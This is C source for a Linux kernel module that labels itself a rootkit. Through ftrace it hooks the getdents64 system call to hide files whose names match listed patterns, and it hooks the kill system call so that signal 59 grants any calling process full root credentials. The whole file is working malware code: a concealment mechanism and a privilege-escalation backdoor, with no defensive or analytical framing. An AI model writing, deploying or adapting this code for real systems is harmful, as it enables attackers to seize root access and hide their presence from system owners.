#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/cred.h>
#include "ftrace_helper.h"

// Forward declare functions
static long filter_dirents(void __user *user_dir, long n, bool is_64);
static bool should_hide_name(const char *curr_name);

/* directory hiding */
static asmlinkage long fake_getdents64(const struct pt_regs *regs);
static asmlinkage long (*real_getdents64)(const struct pt_regs *regs);

/* priv escalation */
static asmlinkage long fake_kill64(const struct pt_regs *regs);
static asmlinkage long (*real_kill64)(const struct pt_regs *regs);

// Function pointer for our symbol searching function
extern unsigned long (*kallsyms_lookup_name_fn)(const char *name);

const char *hidden_patterns[] = {
    "monkey",
    "prince_sucks",
    "blahblah",
    NULL
};

#ifndef HAVE_LINUX_DIRENT
struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[];
};
#endif

/* ALL MY HOOKS */
ftrace_hook dirents_hook = { 
    .name = "__x64_sys_getdents64",
    .function = fake_getdents64,
    .original = &real_getdents64,
};

ftrace_hook kill_hook = {
    .name = "__x64_sys_kill",
    .function = fake_kill64,
    .original = &real_kill64,
};

/* START NEW STUFF */
static asmlinkage long fake_kill64(const struct pt_regs *regs)
{
    /* Extract syscall arguments */
    int pid = (int)regs->di;
    int signal = (int)regs->si;

    /* Check if we passed our special kill signal */
    if (signal == 59) {
        struct cred *new_creds;
        new_creds = prepare_creds();
        if (!new_creds) {
            pr_info("[rootkit] ERROR: Couldn't create new credentials for PID: %d\n", pid);
            return 0;
        }

        /* Update our creds to root */
        new_creds->uid.val   = 0;
        new_creds->gid.val   = 0;
        new_creds->suid.val  = 0;
        new_creds->sgid.val  = 0;
        new_creds->fsuid.val = 0;
        new_creds->fsgid.val = 0;
        new_creds->euid.val  = 0;
        new_creds->egid.val  = 0;

        commit_creds(new_creds);

        return 0;
    }

    /* Otherwise just do kill! */
    return real_kill64(regs);
}
/* END NEW STUFF */

static asmlinkage long fake_getdents64(const struct pt_regs *regs)
{
    long ret = real_getdents64(regs);
    if (ret <= 0) return ret;

    // 3. Modify results
    return filter_dirents((void __user *)regs->si, ret, true);
}

static long filter_dirents(void __user *user_dir, long n, bool is_64)
{
    char *kernel_buf;
    char *filtered_buf;
    long offset = 0;
    long new_offset = 0;
    long result = n;

    if (n <= 0)
        return n;

    kernel_buf = kmalloc(n, GFP_KERNEL);
    if (!kernel_buf)
        return -ENOMEM;

    if (copy_from_user(kernel_buf, user_dir, n)) {
        kfree(kernel_buf);
        return -EFAULT;
    }

    filtered_buf = kzalloc(n, GFP_KERNEL);
    if (!filtered_buf) {
        kfree(kernel_buf);
        return -ENOMEM;
    }

    while (offset < result) {
        char *curr_name;
        unsigned long reclen;
        void *curr_entry = kernel_buf + offset;

        if (is_64) {
            struct linux_dirent64 *d = (struct linux_dirent64*)curr_entry;
            curr_name = d->d_name;
            reclen = d->d_reclen;
        } else {
            struct linux_dirent *d = (struct linux_dirent*)curr_entry;
            curr_name = d->d_name;
            reclen = d->d_reclen;
        }

        if (!should_hide_name(curr_name)) {
            if (new_offset + reclen <= n) {
                memcpy(filtered_buf + new_offset, curr_entry, reclen);
                new_offset += reclen;
            }
        }

        offset += reclen;
    }

    if (copy_to_user(user_dir, filtered_buf, new_offset)) {
        kfree(kernel_buf);
        kfree(filtered_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    kfree(filtered_buf);
    return new_offset;
}

bool should_hide_name(const char *name)
{
    if (!name)
        return false;

    for (int i = 0; hidden_patterns[i] != NULL; i++) {
        if (strstr(name, hidden_patterns[i])) {
            return true;
        }
    }

    return false;
}

int init_rootkit(void)
{
    pr_info("[rootkit] - Hello\n");
    install_hook(&dirents_hook);
    install_hook(&kill_hook);
    
    return 0;
}

void exit_rootkit(void)
{
    remove_hook(&dirents_hook);
    remove_hook(&kill_hook);
    pr_info("[rootkit] - Bye\n");
}

module_init(init_rootkit);
module_exit(exit_rootkit);
MODULE_LICENSE("GPL");
